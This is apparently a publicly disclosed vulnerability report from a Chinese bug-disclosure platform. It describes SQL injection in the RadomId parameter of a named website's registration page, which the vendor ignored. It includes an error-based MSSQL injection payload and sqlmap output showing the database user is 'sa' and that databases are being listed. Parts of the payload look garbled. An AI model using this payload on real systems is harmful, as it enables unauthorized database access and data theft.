wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-06-12：	细节已通知厂商并且等待厂商处理中									2014-06-17：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 厂商往下看~~ 详细说明：  漏洞存在页面：http://www.teatree.cn/register_loading.aspx?RadomId=1#1.注册完成之后,有个邮箱验证,我就直接点开了。家了个参数1 单引号直接爆出查询语句



#2.直接去工具跑下喽。结果意想不到啊==






---Place: GETParameter: RadomId    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING    Payload: RadomId=1' AND 2238=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(110117)+CHAR(58)+(SELECT (CASE WHEN (2238=2238) THEN CHAR(49) ELSE CHAR(48)HAR(58)+CHAR(101)+CHAR(104)+CHAR(99)+CHAR(58))) AND 'hhPW'='hhPW---[16:04:49] [INFO] testing MySQL[16:04:50] [WARNING] the back-end DBMS is not MySQL[16:04:50] [INFO] testing Oracle[16:04:50] [WARNING] the back-end DBMS is not Oracle[16:04:50] [INFO] testing PostgreSQL[16:04:50] [WARNING] the back-end DBMS is not PostgreSQL[16:04:50] [INFO] testing Microsoft SQL Server[16:04:51] [INFO] confirming Microsoft SQL Server[16:04:58] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2005[16:04:58] [INFO] fetching current user[16:04:58] [INFO] retrieved: sacurrent user:    'sa'[16:04:58] [INFO] fetching database names[16:04:59] [INFO] the SQL query used returns 7 entriesavailable databases [7]:
